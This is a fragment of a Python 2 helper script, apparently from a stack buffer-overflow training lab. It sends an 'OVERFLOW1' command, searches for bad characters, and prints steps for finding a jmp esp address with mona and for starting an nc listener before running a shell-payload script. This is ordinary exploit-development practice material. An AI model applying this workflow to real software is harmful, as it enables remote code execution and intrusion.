...
#### Change offset variable (not approx_offset)  #######
...
#Leaving a space after cmd name is important!!
cmd = "OVERFLOW1 "
...
bad = "\x00\x07\x08\x2e\x2f\xa0\xa1"  #separate bad chars by \
...
def find_badchars(addr,cmd,bad,offset,timeout):
	...
	while True:
		try:
			...
			print "Reset debugger and re-run module until all the chars in the stack are unmodified"
			print "-------------------------------------------------------------"
			print "Once all chars unmodified restart and run: !mona jmp -r esp -cpb \"%s\" " % j
			print "From log window select any jmp esp address. Add to the esp variable in 3.shell. This address will be written in reverse per 2 characters ex/ 12345678 becomes x78\ x56\ x34\ x12 (without the spaces)."
			print "-------------------------------------------------------------"
			print "Restart program. Start nc listener and run 3.shell.py"
			return
	return
